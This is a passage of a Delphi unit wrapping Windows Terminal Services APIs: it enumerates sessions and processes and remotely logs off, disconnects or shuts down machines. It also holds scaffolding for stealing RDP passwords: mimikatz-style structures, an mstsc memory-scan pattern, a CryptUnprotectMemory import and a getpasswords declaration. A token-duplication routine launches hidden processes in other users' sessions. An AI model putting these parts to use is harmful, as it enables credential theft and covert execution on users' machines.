unit wtsapi32;

interface

uses windows,winsta,classes,utils,memfuncs,umemory,ntdll,injection;
  //instdecode in '..\ddetours\delphi-detours-library-master\Source\instdecode.pas';

 const
  WTS_CURRENT_SERVER        = THandle(0);
  WTS_CURRENT_SERVER_HANDLE = THandle(0);
  WTS_CURRENT_SERVER_NAME   = '';

//
//  Specifies the current session (SessionId)
//

  WTS_CURRENT_SESSION = DWORD(-1);

//
//  Possible pResponse values from WTSSendMessage()
//

  IDTIMEOUT = 32000;
  IDASYNC   = 32001;

//
//  Shutdown flags
//

  WTS_WSD_LOGOFF = $00000001;           // log off all users except
                                         // current user; deletes
                                        // WinStations (a reboot is
                                        // required to recreate the
                                        // WinStations)
  WTS_WSD_SHUTDOWN = $00000002;         // shutdown system

  WTS_WSD_REBOOT   = $00000004;         // shutdown and reboot

  WTS_WSD_POWEROFF = $00000008;         // shutdown and power off (on

                                        // machines that support power
                                        // off through software)
  WTS_WSD_FASTREBOOT = $00000010;       // reboot without logging users
                                        // off or shutting down

  WTS_PROTOCOL_TYPE_CONSOLE = 0; // Console

  WTS_PROTOCOL_TYPE_ICA     = 1; // ICA Protocol

  WTS_PROTOCOL_TYPE_RDP     = 2; // RDP Protocol

//WTS_EVENTS
  WTS_EVENT_NONE        = $00000000; // return no event
  {$EXTERNALSYM WTS_EVENT_NONE}
  WTS_EVENT_CREATE      = $00000001; // new WinStation created
  {$EXTERNALSYM WTS_EVENT_CREATE}
  WTS_EVENT_DELETE      = $00000002; // existing WinStation deleted
  {$EXTERNALSYM WTS_EVENT_DELETE}
  WTS_EVENT_RENAME      = $00000004; // existing WinStation renamed
  {$EXTERNALSYM WTS_EVENT_RENAME}
  WTS_EVENT_CONNECT     = $00000008; // WinStation connect to client
  {$EXTERNALSYM WTS_EVENT_CONNECT}
  WTS_EVENT_DISCONNECT  = $00000010; // WinStation logged on without client
  {$EXTERNALSYM WTS_EVENT_DISCONNECT}
  WTS_EVENT_LOGON       = $00000020; // user logged on to existing WinStation
  {$EXTERNALSYM WTS_EVENT_LOGON}
  WTS_EVENT_LOGOFF      = $00000040; // user logged off from existing WinStation
  {$EXTERNALSYM WTS_EVENT_LOGOFF}
  WTS_EVENT_STATECHANGE = $00000080; // WinStation state change
  {$EXTERNALSYM WTS_EVENT_STATECHANGE}
  WTS_EVENT_LICENSE     = $00000100; // license state change
  {$EXTERNALSYM WTS_EVENT_LICENSE}
  WTS_EVENT_ALL         = $7fffffff; // wait for all event types
  {$EXTERNALSYM WTS_EVENT_ALL}
  WTS_EVENT_FLUSH       = DWORD($80000000); // unblock all waiters
  {$EXTERNALSYM WTS_EVENT_FLUSH}


//_WTS_INFO_CLASS
  type  _WTS_INFO_CLASS= (
  WTSInitialProgram,
  WTSApplicationName,
  WTSWorkingDirectory,
  WTSOEMId,
  WTSSessionId,
  WTSUserName,
  WTSWinStationName,
  WTSDomainName,
  WTSConnectState,
  WTSClientBuildNumber,
  WTSClientName,
  WTSClientDirectory,
  WTSClientProductId,
  WTSClientHardwareId,
  WTSClientAddress,
  WTSClientDisplay,
  WTSClientProtocolType
);
WTS_INFO_CLASS = _WTS_INFO_CLASS;

//_WTS_CONNECTSTATE_CLASS
type _WTS_CONNECTSTATE_CLASS = (
    WTSActive,              // User logged on to WinStation
    WTSConnected,           // WinStation connected to client
    WTSConnectQuery,        // In the process of connecting to client
    WTSShadow,              // Shadowing another WinStation
    WTSDisconnected,        // WinStation logged on without client
    WTSIdle,                // Waiting for client to connect
    WTSListen,              // WinStation is listening for connection
    WTSReset,               // WinStation is being reset
    WTSDown,                // WinStation is down due to error
    WTSInit);               // WinStation in initialization
WTS_CONNECTSTATE_CLASS = _WTS_CONNECTSTATE_CLASS;

type  _WTSINFO  =record
   State:WTS_CONNECTSTATE_CLASS;
   SessionId:DWORD;
   IncomingBytes:DWORD;
   OutgoingBytes:DWORD;
   IncomingCompressedBytes:DWORD;
   OutgoingCompressedBytes:DWORD;
   WinStationName:WCHAR;
   Domain:WCHAR;
   UserName:WCHAR;
   ConnectTime:LARGE_INTEGER;
   DisconnectTime:LARGE_INTEGER;
   LastInputTime:LARGE_INTEGER;
   LogonTime:LARGE_INTEGER;
   CurrentTime:LARGE_INTEGER;
end;
PWTSINFO=^_WTSINFO;

//_WTS_SESSION_INFOA
type _WTS_SESSION_INFOA = record
  SessionId: DWORD; // identificativo univoco della sessione nel contesto del server
  pWinStationName: LPSTR; // puntatore ad una stringa che identifica
                          // il nome della sessione Terminal (RDP-Tcp#)
  State: WTS_CONNECTSTATE_CLASS; // stato della connessione
end;
  WTS_SESSION_INFOA = _WTS_SESSION_INFOA;
  PWTS_SESSION_INFOA = ^WTS_SESSION_INFOA;

//_WTS_PROCESS_INFOA
  type _WTS_PROCESS_INFOA = record
  SessionId: DWORD; // identificativo univoco della sessione nel contesto del server Terminal
  ProcessId: DWORD; // Process Id
  pProcessName: LPSTR; // puntatore ad una stringa che definisce il nome del processo
  pUserSid: PSID; // puntatore al SID dell' utente
end;
WTS_PROCESS_INFOA = _WTS_PROCESS_INFOA;
PWTS_PROCESS_INFOA = ^WTS_PROCESS_INFOA;

//_WTS_CLIENT_ADDRESS
type _WTS_CLIENT_ADDRESS = record
  AddressFamily: DWORD;           // AF_INET, AF_IPX, AF_NETBIOS, AF_UNSPEC
  Address: array [0..19] of BYTE; // indirizzo IP del client
end;
WTS_CLIENT_ADDRESS = _WTS_CLIENT_ADDRESS;
PWTS_CLIENT_ADDRESS = ^WTS_CLIENT_ADDRESS;

//_WTS_SERVER_INFOA
type  _WTS_SERVER_INFOA = record
    pServerName: PAnsiChar; // server name
  end;
  WTS_SERVER_INFOA = _WTS_SERVER_INFOA;
  PWTS_SERVER_INFOA = ^WTS_SERVER_INFOA;

type _WTS_CLIENT_DISPLAY = record
  HorizontalResolution: DWORD; // larghezza in pixels
  VerticalResolution: DWORD;   // altezza in pixels
  ColorDepth: DWORD;
end;
  WTS_CLIENT_DISPLAY = _WTS_CLIENT_DISPLAY;

type session = record
WTSSessionid:string;
WTSWinStationName:string;
WTSState:string;
WTSUserName:string;
WTSClientName:string;
WTSAppName:string;
WTSClientIP:string;
WinstaLogonTime:string;
WinstaIdleTime:string;
end;

type aSession=array of session;

type process = record
WTSSessionid:string;
WTSProcessId:string;
WTSProcessName:string;
WTSUserName:string;
WTSApplicationName:string;
WTSWinStationName:string;
WTSDomainName:string;
WTSClientName:string;
end;


type aProcess=array of process;

type TLoggedUser=record
username:string;
logontime:string;
clientname:string;
sessionname:string;
end;

Type TLoggedUsers=array of TLoggedUser;

  type _TS_PROPERTY_KIWI =record
	 szProperty:pointer; //PCWSTR;
	 dwType:DWORD;
	 pvData:PVOID;
	 unkp0:PVOID;
	 unkd0:DWORD;
	 dwFlags:DWORD;
	 unkd1:DWORD;
	 unkd2:DWORD;
	 pValidator:PVOID;
	 unkp2:PVOID; // password size or ?, maybe a DWORD then align
	 unkp3:PVOID;
end;
    TS_PROPERTY_KIWI=_TS_PROPERTY_KIWI;
        PTS_PROPERTY_KIWI=^TS_PROPERTY_KIWI;

type _TS_PROPERTIES_KIWI =record
	 unkp0:PVOID; // const CTSPropertySet::`vftable'{for `CTSObject'}
	 unkp1:PVOID; // "CTSPropertySet"
	 unkh0:DWORD; // 0xdbcaabcd
	 unkd0:DWORD; // 3
	 unkp2:PVOID;
	 unkd1:DWORD; // 45
	 unkp3:PVOID; // tagPROPERTY_ENTRY near * `CTSCoreApi::internalGetPropMap_CoreProps(void)'::`2'::_PropSet
	 pProperties:pointer; //PTS_PROPERTY_KIWI;
	 cbProperties:DWORD; // 198
end;
      TS_PROPERTIES_KIWI=_TS_PROPERTIES_KIWI;
      PTS_PROPERTIES_KIWI=^TS_PROPERTIES_KIWI;

const mstsc_pattern:array[0..4] of byte=($cd,$ab,$ca,$db,$03);

type
  tdata=record
    pDataIn:LPVOID;
    cbDataIn:DWORD
    end;
  Ptrdata=^tdata;

type TJwWTSEventThread = class(TThread)
  protected
    //
    //FOwner: TJwTerminalServer;
    FServerHandle:thandle;
    FLastEventFlag,FEventFlag: DWORD;
    procedure DispatchEvent;
    procedure FireEvent(EventFlag: DWORD);
  public
    //
    OnSessionConnect: TNotifyEvent;
    OnSessionCreate: TNotifyEvent;
    OnSessionDelete: TNotifyEvent;
    OnSessionDisconnect: TNotifyEvent;
    OnSessionEvent: TNotifyEvent;
    OnLicenseStateChange: TNotifyEvent;
    OnSessionLogon: TNotifyEvent;
    OnSessionLogoff: TNotifyEvent;
    OnSessionStateChange: TNotifyEvent;
    OnWinStationRename: TNotifyEvent;
    //
    constructor Create(CreateSuspended: Boolean; serverhandle: thandle);
    procedure Execute; override;
  end;



var
//
//functions
//
 WTSEnumerateServersA:function(
  pDomainName: LPSTR; //nome del dominio
  Reserved: DWORD; //deve essere settata a 0
  Version: DWORD; //deve essere settata a 1
  var ppServerInfo: PWTS_SERVER_INFOA; //informazioni sul server
  var pCount: DWORD //numero di server Terminal presenti nel dominio in questione
): BOOL; stdcall;

 WTSEnumerateSessionsA:function(
  hServer: tHANDLE; //handle del server Terminal (ottenuto con WTSOpenServer(pChar(NomeServer)))
  Reserved: DWORD; //deve essere settato a 0
  Version: DWORD; //deve essere settato a 1
  var ppSessionInfo: PWTS_SESSION_INFOA; //informazioni sulla sessione
  var pCount: DWORD //numero di sessioni
): BOOL; stdcall;

 WTSQuerySessionInformationA:function(
  hServer: tHANDLE; // handle del server Terminal (ottenuto con WTSOpenServer(pChar(NomeServer)))
  SessionId: DWORD; //Identificativo univoco della sessione nel contesto del server Terminal
  WTSInfoClass: dword {WTS_INFO_CLASS};
  // tipo enumerativo che indica l' informazione che si vuole ottenere sulla sessione
  var pBuffer: Pointer; // puntatore all' informazione richiesta
  var pBytesReturned: DWORD // dimensione totale dell' informazione richiesta
): bool; stdcall;

 WTSEnumerateProcessesA:function(hServer: THandle; Reserved: DWORD; Version: DWORD;
  var ppProcessInfo: PWTS_PROCESS_INFOA; var pCount: DWORD): BOOL; stdcall;

 WTSOpenServerA:function(pServerName: PAnsiChar): THandle; stdcall;

 WTSCloseServer:procedure(hServer: THandle); stdcall;

  WTSSendMessageA:function(
   hServer:THandle;
   SessionId:DWORD;
   pTitle:LPTSTR;
   TitleLength:DWORD;
   pMessage:LPTSTR;
   MessageLength:DWORD;
   Style:DWORD;
   Timeout:DWORD;
   var pResponse:dword;
   bWait:BOOL):bool;stdcall;



  WTSTerminateProcess:function(
   hServer:thandle;
   ProcessId:DWORD;
   ExitCode:DWORD):bool;stdcall;

   WTSLogoffSession:function(hServer: THandle; SessionId: DWORD; bWait: BOOL): BOOL; stdcall;

   WTSDisconnectSession:function(hServer: tHANDLE; SessionId: DWORD; bWait: BOOL): BOOL; stdcall;


 WTSFreeMemory:procedure(pMemory: Pointer); stdcall;

 WTSShutdownSystem:function(hServer: HANDLE; ShutdownFlag: DWORD): BOOL; stdcall;

 WTSQueryUserToken:function (SessionId: ULONG; var phToken: HANDLE): BOOL; stdcall;

 WTSGetActiveConsoleSessionId:function  :DWORD; stdcall;

 WTSWaitSystemEvent:function(hServer: HANDLE; EventMask: DWORD;
  var pEventFlags: DWORD): BOOL; stdcall;

 CryptUnprotectMemory:function(pDataIn:LPVOID;cbDataIn:DWORD;dwFlags:DWORD): BOOL; stdcall;

  {
  BOOL WINAPI WTSStartRemoteControlSessionA(LPSTR, ULONG, BYTE, USHORT);
  BOOL WINAPI WTSStartRemoteControlSessionW(LPWSTR, ULONG, BYTE, USHORT);
  #define     WTSStartRemoteControlSession WINELIB_NAME_AW(WTSStartRemoteControlSession)
  BOOL WINAPI WTSStopRemoteControlSession(ULONG);
  }

type
SECURITY_IMPERSONATION_LEVEL = (SecurityAnonymous, SecurityIdentification,
    SecurityImpersonation, SecurityDelegation);
TOKEN_TYPE = (TokenTypePad0, TokenPrimary, TokenImpersonation);

 function DuplicateTokenEx(hExistingToken: HANDLE; dwDesiredAccess: DWORD;
  lpTokenAttributes: LPSECURITY_ATTRIBUTES; ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL;
  TokenType: TOKEN_TYPE; var phNewToken: HANDLE): BOOL; stdcall; external 'advapi32.dll';

 {
 function CreateProcessWithTokenW(hToken: THandle;
  dwLogonFlags: DWORD;
  lpApplicationName: PWideChar;
  lpCommandLine: PWideChar;
  dwCreationFlags: DWORD;
  lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar;
  lpStartupInfo: PStartupInfoW;
  lpProcessInformation: PProcessInformation): BOOL; stdcall;external 'advapi32.dll';
 }

 type
  TCreateProcessWithTokenW=function(hToken: THandle;
  dwLogonFlags: DWORD;
  lpApplicationName: PWideChar;
  lpCommandLine: PWideChar;
  dwCreationFlags: DWORD;
  lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar;
  lpStartupInfo: PStartupInfoW;
  lpProcessInformation: PProcessInformation): BOOL; stdcall;

 function CreateEnvironmentBlock(var lpEnvironment:Pointer;hToken:THandle;bInherit:BOOL):BOOL;stdcall;external 'userenv.dll';
 function DestroyEnvironmentBlock(pEnvironment:Pointer):BOOL;stdcall;external 'userenv.dll';

 //function IsProcessInJob(ProcessHandle, JobHandle: HANDLE; var Result_: BOOL): BOOL; stdcall; external 'kernel32.dll';

 //
//function GetWTSString(hserver:thandle;SessionID:dword; wtsInfo: _WTS_INFO_CLASS):string;
function GetWTSString(hserver:thandle;SessionID:dword; wtsInfo: dword):string;
function ConnectState(ConnectState: WTS_CONNECTSTATE_CLASS): string;
function ColorsNumber(ColorDepth: integer): string;
function ProtocolType(Tipo: integer): string;
function wtssessions(server:string;var sessions:asession):dword;
function wtsprocesses(server:string;var processes:aprocess):dword;
function TSLogoff(server:string;sessionid:dword):dword;
function TSDisconnect(server:string;sessionid:dword):dword;
function TSTerminate(server:string;processid:dword):dword;
//function GetLoggedOnUsers(servername:string;var users:TLoggedUsers):boolean;
function runTSprocess(sessionid:cardinal;process:string):boolean;
function wtsPing(server:string):boolean;
function WTSShutdown(server:string;flag:dword):boolean;
function getpasswords(pid:dword):boolean;

//function decryptmemory(param:pointer):cardinal;stdcall;

//function CryptUnprotectMemory(pDataIn:LPVOID;cbDataIn:DWORD;dwFlags:DWORD): BOOL; stdcall; external 'dpapi.dll';

implementation

uses sysutils;

const
  apilib = 'wtsapi32.dll';

var
 HApi: THandle = 0;

 function InitAPI: Boolean;
begin
  Result := False;
  if Win32Platform <> VER_PLATFORM_WIN32_NT then Exit;
  if HApi = 0 then HApi := LoadLibrary(apilib);
  if HApi > HINSTANCE_ERROR then
  begin
    @WTSEnumerateServersA := GetProcAddress(HApi, 'WTSEnumerateServersA');
    @WTSEnumerateSessionsA := GetProcAddress(HApi, 'WTSEnumerateSessionsA');
    @WTSQuerySessionInformationA := GetProcAddress(HApi, 'WTSQuerySessionInformationA');
    @WTSEnumerateProcessesA := GetProcAddress(HApi, 'WTSEnumerateProcessesA');
    @WTSOpenServerA := GetProcAddress(HApi, 'WTSOpenServerA');
    @WTSCloseServer := GetProcAddress(HApi, 'WTSCloseServer');
    @WTSFreeMemory := GetProcAddress(HApi, 'WTSFreeMemory');
    @WTSTerminateProcess := GetProcAddress(HApi, 'WTSTerminateProcess');
    @WTSLogoffSession := GetProcAddress(HApi, 'WTSLogoffSession');
    @WTSDisconnectSession := GetProcAddress(HApi, 'WTSDisconnectSession');
    @WTSSendMessageA := GetProcAddress(HApi, 'WTSSendMessageA');
    @WTSShutdownSystem:=GetProcAddress(HApi, 'WTSShutdownSystem');
    @WTSQueryUserToken:= GetProcAddress(HApi, 'WTSQueryUserToken');
    @WTSWaitSystemEvent:= GetProcAddress(HApi, 'WTSWaitSystemEvent');
    //@WinStationQueryInformationW:= GetProcAddress(HApi, 'WinStationQueryInformationW');
    @WTSGetActiveConsoleSessionId:=getprocaddress(LoadLibrary('kernel32.dll'),'WTSGetActiveConsoleSessionId');
    //
    @CryptUnProtectMemory := GetProcAddress(LoadLibrary('dpapi.dll'), 'CryptUnProtectMemory');
    Result := True;
  end;
end;

procedure FreeAPI;
begin
  if HApi <> 0 then FreeLibrary(HApi);
  HApi := 0;
end;

function SID2Name(ServerName,strsid:string):string;
const
  MAX_NAME_STRING = 1024;
var
subAuthorityCount: BYTE;
authority: SID_IDENTIFIER_AUTHORITY;
sid: PSID;
userNameSize: DWORD;
domainNameSize: DWORD;
userName, domainName: array[0..MAX_NAME_STRING] of Char;
sidType: SID_NAME_USE;

revision: DWORD;
authorityVal: DWORD;
subAuthorityVal: array[0..7] of DWORD;

function getvals(s: string): Integer;
  var
    i, j, k, l: integer;
    tmp: string;
  begin
    Delete(s, 1, 2);
    j   := Pos('-', s);
    tmp := Copy(s, 1, j - 1);
    val(tmp, revision, k);
    Delete(s, 1, j);
    j := Pos('-', s);
    tmp := Copy(s, 1, j - 1);
    val('$' + tmp, authorityVal, k);
    Delete(s, 1, j);
    i := 2;
    s := s + '-';
    for l := 0 to 7 do
    begin
      j := Pos('-', s);
      if j > 0 then
      begin
        tmp := Copy(s, 1, j - 1);
        val(tmp, subAuthorityVal[l], k);
        Delete(s, 1, j);
        Inc(i);
      end
      else
        break;
    end;
    Result := i;
  end;

begin
result:='';
 revision     := 0;
  authorityVal := 0;
  FillChar(subAuthorityVal, SizeOf(subAuthorityVal), #0);
   FillChar(userName, SizeOf(userName), #0);
  FillChar(domainName, SizeOf(domainName), #0);
//
subAuthorityCount := getvals(strsid);
      if (subAuthorityCount >= 3) then
      begin
        subAuthorityCount := subAuthorityCount - 2;
        if (subAuthorityCount < 2) then subAuthorityCount := 2;
        authority.Value[5] := PByte(@authorityVal)^;
        authority.Value[4] := PByte(DWORD(@authorityVal) + 1)^;
        authority.Value[3] := PByte(DWORD(@authorityVal) + 2)^;
        authority.Value[2] := PByte(DWORD(@authorityVal) + 3)^;
        authority.Value[1] := 0;
        authority.Value[0] := 0;
        sid := nil;
        userNameSize := MAX_NAME_STRING;
        domainNameSize := MAX_NAME_STRING;
        if AllocateAndInitializeSid(authority, subAuthorityCount,
          subAuthorityVal[0], subAuthorityVal[1], subAuthorityVal[2],
          subAuthorityVal[3], subAuthorityVal[4], subAuthorityVal[5],
          subAuthorityVal[6], subAuthorityVal[7], sid) then
        begin
          if LookupAccountSid(PChar(ServerName), sid, userName, userNameSize,
            domainName, domainNameSize, sidType) then
          begin
            result:= (string(userName));
          end;
        end;
        if Assigned(sid) then FreeSid(sid);
      end;
end;



function GetWTSString(hserver:thandle;SessionID:dword; wtsInfo:dword {_WTS_INFO_CLASS}):string;
const af_inet=2;
  var
    Ptr : Pointer;
    R : DWORD;
    st:_systemtime;
    dt:tdatetime;
  begin
    try
    R := 0;
    Ptr := nil;
    if WTSQuerySessionInformationA(hserver, SessionID,dword(wtsInfo), Ptr, R) then
    begin
    if r>1 then
      begin
      case wtsInfo of
      dword(WTSClientAddress):
        begin
          with PWTS_CLIENT_ADDRESS(ptr)^ do
          begin
          if AddressFamily =af_inet
            then result:= IntToStr(Address[2]) +
            '.' + IntToStr(Address[3]) + '.' + IntToStr(Address[4]) +
            '.' + IntToStr(Address[5]) else result:='';
          end;
        end; //if wtsInfo=WTSClientAddress then
        24: //WTSSessionInfo vista/longhorn only
          begin
          with PWTSINFO(ptr)^ do
            begin
            FileTimeToLocalFileTime( _filetime(logontime) , _filetime(logontime) );
            FileTimeToSystemTime( _filetime(logontime), st );
            dt:=SystemTimeToDateTime(st);
            result:=DateTimeToStr (dt) ;
            end;
          end;
        else Result := PChar(Ptr) ;
        end; //case
      end //if r>1 then
      else result:='';
    end //if WTSQuerySessionInformationA
    else Result := ('<Unknown>');
finally
    WTSFreeMemory(Ptr);
end;
end;

function ConnectState(ConnectState: WTS_CONNECTSTATE_CLASS): string;
begin
  case ConnectState of
    WTSActive: Result := 'Active';
    WTSConnected: Result := 'Connected';
    WTSConnectQuery: Result := 'ConnectQuery';
    WTSShadow: Result := 'Shadow';
    WTSDisconnected: Result := 'Disconnected';
    WTSIdle: Result := 'Idle';
    WTSListen: Result := 'Listen';
    WTSReset: Result := 'Reset';
    WTSDown: Result := 'Down';
    WTSInit: Result := 'Init';
  end;
end;

function ColorsNumber(ColorDepth: integer): string;
begin
  case ColorDepth of
    1: Result := '16 colors';
    2: Result := '256 colors';
    4: Result := '2^16 colors';
    8: Result := '2^24 colors';
    16: Result := '2^15 colors';
  end;
end;

function ProtocolType(Tipo: integer): string;
begin
  case Tipo of
    WTS_PROTOCOL_TYPE_CONSOLE: result:='console';
    WTS_PROTOCOL_TYPE_ICA: result:='ICA';
    WTS_PROTOCOL_TYPE_RDP: result:='RDP';
  end;
end;

function runTSprocess(sessionid:cardinal;process:string):boolean;
const
 CREATE_BREAKAWAY_FROM_JOB=$01000000;
var hToken,UserToken: THandle;
  si: _STARTUPINFOA;
  pi: _PROCESS_INFORMATION;
  Ret: Cardinal;
  sTitle: string;
  sMsg: string;
  p:pointer=nil;
  creationFlags:dword=0;
  CreateProcessWithTokenW:pointer;
begin
//
  CreateProcessWithTokenW:=getprocaddress(loadlibrary('advapi32.dll'),'CreateProcessWithTokenW');
//
result:=false;
//works only if run as local system
  ZeroMemory(@si, SizeOf(si));
  si.cb := SizeOf(si);
  si.lpDesktop := nil; //'winsta0\\default';
  si.wShowWindow :=SW_HIDE ;
  hToken:=0;
  //sessionid:=WtsGetActiveConsoleSessionID;
  writeln('sessionid:'+IntToStr (sessionid));
  writeln('process:'+process);
  if WTSQueryUserToken(sessionid, hToken) then
  begin
  writeln('WTSQueryUserToken OK');
  // Convert the impersonation token to a primary token
  //param2 nil and not MAXIMUM_ALLOWED ?
  if DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, 0,SecurityImpersonation, TokenPrimary, UserToken)=true then
  begin
  writeln('DuplicateTokenEx OK');
  if not CloseHandle(hToken) then writeln('CloseHandle failed');
  if not SetTokenInformation(UserToken, TokenSessionId, @sessionId, sizeof(DWORD))
     then writeln('SetTokenInformation failed')
     else writeln('SetTokenInformation OK');
  //param1 not htoken but usertoken
  {
  if not CreateEnvironmentBlock(p,UserToken,false)
    then writeln('CreateEnvironmentBlock failed')
    else writeln('CreateEnvironmentBlock OK') ;
  }
  //enable the below if you decide to use CreateEnvironmentBlock
  //check JOB_OBJECT_LIMIT_BREAKAWAY_OK|JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK ?
  //creationFlags := CREATE_UNICODE_ENVIRONMENT or CREATE_NEW_CONSOLE {or CREATE_BREAKAWAY_FROM_JOB};
    //if CreateProcessAsUser(UserToken, nil, pchar(process), nil, nil, False,creationFlags , p, nil, @si, @pi) then
    if TCreateProcessWithTokenW(CreateProcessWithTokenW)(UserToken, 0, nil, pwidechar(widestring(process)), creationFlags, p, nil, @si, @pi) then
    begin
      // Do some stuff
      result:=true;
      writeln('pid:'+inttostr(pi.dwProcessId));
    end
    else writeln('CreateProcessAsUser failed,'+inttostr(getlasterror));
    end
    else writeln('DuplicateTokenEx failed,'+inttostr(getlasterror));
  end //if WTSQueryUserToken(sessionid, hToken) then
  else writeln('WTSQueryUserToken failed,'+inttostr(getlasterror));
end;

{
function GetLoggedOnUsers(servername:string;var users:TLoggedUsers):boolean;
const
  MAX_NAME_STRING = 1024;
var
reg:tregistry;
info:TRegKeyInfo;
keys:tstrings;
i:byte;
//ServerName:string;
LogonTime:_systemtime;
dt:tdatetime;
username:string;
begin
//memo1.Lines.Clear ;
//ServerName:=txthost.Text  ;
result:=false;
reg:=tregistry.Create ;
reg.RootKey :=HKEY_USERS;
if reg.RegistryConnect(ServerName)=true then
  begin
  if reg.OpenKey('',false)=true then
  keys:=tstringlist.Create ;
  reg.GetKeyNames(keys);
  if keys.Count >0 then
  begin
  result:=true;
  SetLength (users,keys.Count);
  for i:=0 to keys.Count -1 do
    begin
    users[i].username:='';users[i].LogonTime:='';
    users[i].clientname :='';users[i].sessionname :='';
    if (pos('classes',LowerCase (keys[i]))=0)
      and (pos('.default',LowerCase (keys[i]))=0) then
        begin
        //
        username:=SID2Name(servername,keys[i]);
        if username<>'' then
        begin
        if reg.OpenKey(keys[i]+'\Volatile Environment',false)=true then
        begin
        if reg.GetKeyInfo(info)=true then
          begin
          FileTimeToLocalFileTime( info.FileTime , info.FileTime );
          FileTimeToSystemTime( info.FileTime, LogonTime );
          dt:=SystemTimeToDateTime(LogonTime);
          users[i].username:=username;
          users[i].LogonTime:=DateTimeToStr (dt);
          users[i].clientname  := reg.ReadString('CLIENTNAME');
          users[i].sessionname := reg.ReadString('SESSIONNAME');
          end
          else
          users[i].username :=username;
        end; //if reg.OpenKey(keys[i]+'\Volatile Environment')=true
        end; //if username<>'' then
        //
        end; //if pos
  end; //  if keys.Count >0
  end; //  if reg.OpenKey('',false)=true
  end; //if reg.RegistryConnect('\\pc_erwan')=true
reg.Free;
end;
}

function TSDisconnect(server:string;sessionid:dword):dword;
var hServer:thandle;
ret:boolean;
begin
result:=0;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
    if hserver=-1 then
    begin
    result:=1; //showmessage('could not connect');
    exit;
    end;
ret:=WTSDisconnectSession(hserver,sessionid,false);
if ret=true then result:=0 else result:=2;
if hserver<>invalid_handle_value then wtscloseserver(hserver);
end;

function TSTerminate(server:string;processid:dword):dword;
var hServer:thandle;
pid:dword;
ret:boolean;
begin
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
    if hserver=-1 then
    begin
    result:=1;
    exit;
    end;
ret:=WTSTerminateProcess(hserver,processid,0);
if ret=true then result:=0 else result:=2;
if hserver<>invalid_handle_value then wtscloseserver(hserver);
end;

function TSLogoff(server:string;sessionid:dword):dword;
var hServer:thandle;
ret:boolean;
begin
result:=0;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
    if hserver=-1 then
    begin
    result:=1; //showmessage('could not connect');
    exit;
    end;
ret:=WTSLogoffSession(hserver,sessionid,false);
if ret=true then result:=0 else result:=2;
if hserver<>invalid_handle_value then wtscloseserver(hserver);
end;

function wtsprocesses(server:string;var processes:aprocess):dword;
var
  p:pointer;
  wtsPInfo:PWTS_PROCESS_INFOA;
  WtsCount,i: Cardinal;
  ret:boolean;
  hServer:thandle;
  snu:sid_name_use;
  user,domain:string;
  lenuser,lendomain:dword;
begin
result:=0;
WtsCount:=0;
//lines.Clear ;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
    if hserver<=0 then
    begin
    result:=1;
    exit;
    end;
ret:=WTSEnumerateProcessesA(hServer, 0, 1, wtsPInfo, WtsCount);
  if (ret=false) and (WtsCount=0) then
    begin
    result:=2;
    wtscloseserver(hserver);
    exit;
    end;
  if (wtscount=0) or (wtsPInfo=nil)  then
    begin
    result:=3;
    wtscloseserver(hserver);
    exit;
    end;
  SetLength (processes,WtsCount);

  for i:= 0 to Pred(WtsCount) do
  begin
  with (PWTS_PROCESS_INFOA(pChar(wtsPInfo) + i * sizeof(WTS_PROCESS_INFOA)))^ do
  begin
    processes[i].WTSSessionid :=IntToStr(SessionId);
    processes[i].WTSProcessId  :=IntToStr(ProcessId);
    processes[i].WTSProcessName   :=pProcessName;
    processes[i].WTSUserName    :=GetWTSString(hServer,SessionId,dword(WTSUserName));
    processes[i].WTSApplicationName     :=GetWTSString(hServer,SessionId,dword(WTSApplicationName));
    processes[i].WTSWinStationName      :=GetWTSString(hServer,SessionId,dword(WTSWinStationName));
    processes[i].WTSDomainName      :=GetWTSString(hServer,SessionId,dword(WTSDomainName));
    processes[i].WTSClientName       :=GetWTSString(hServer,SessionId,dword(WTSClientName));
  end; //with
  //Inc(wtsPInfo);
  end; //for
  if wtsPInfo<>nil then WTSFreeMemory(wtsPInfo);
  if hserver<>invalid_handle_value then wtscloseserver(hserver);
end; //proc

function WTSShutdown(server:string;flag:dword):boolean;
var
  hServer:thandle;
begin
result:=false;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
if hserver<=0 then
    begin
    result:=false;//showmessage('could not connect,'+SystemErrorMessage(getlasterror));
    exit;
    end;
//
result:=WTSShutdownSystem (hserver,flag);
//
if hserver<>invalid_handle_value then wtscloseserver(hserver);
end;

function wtsPing(server:string):boolean;
var
  hServer:thandle;
begin
result:=false;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
if hserver<=0 then
    begin
    result:=false;//showmessage('could not connect,'+SystemErrorMessage(getlasterror));
    exit;
    end;
//
result:=WinStationServerPing(hserver);
//
if hserver<>invalid_handle_value then wtscloseserver(hserver);
end;

function wtssessions(server:string;var sessions:asession):dword;
var
  hServer:thandle;
  CountSessions: DWORD; //numero sessioni
  i, j: integer;
  pBuffer: Pointer;
  pBytesreturned: DWord;
  pSessionInfo:PWTS_SESSION_INFOA;
  name:string;
  ret:boolean;
begin
result:=0;
CountSessions:=0;
//lines.Clear ;
hServer:=thandle(-1);
  hServer := WTSOpenServerA(pansichar(server));
    if hserver<=0 then
    begin
    result:=1;//showmessage('could not connect,'+SystemErrorMessage(getlasterror));
    exit;
    end;
  ret:=WTSEnumerateSessionsA(hServer, 0, 1, pSessionInfo, CountSessions);
  if (ret=false) and (CountSessions=0) then
    begin
    result:=2; //showmessage(SystemErrorMessage(getlasterror));
    try wtscloseserver(hserver); except end;
    exit;
    end;
  if (CountSessions=0) or (pSessionInfo=nil) then
    begin
    try wtscloseserver(hserver); except end;
    result:=3;
    exit;
    end;
  SetLength (sessions,CountSessions);
  for j := 0 to CountSessions - 1 do
    begin
      with (PWTS_SESSION_INFOA(pChar(pSessionInfo) + j * sizeof(WTS_SESSION_INFOA)))^ do
        begin
        sessions[j].WTSsessionid:=inttostr(sessionid);
        sessions[j].WTSWinStationName:=pWinStationName;
        sessions[j].WTSstate:=ConnectState(state);
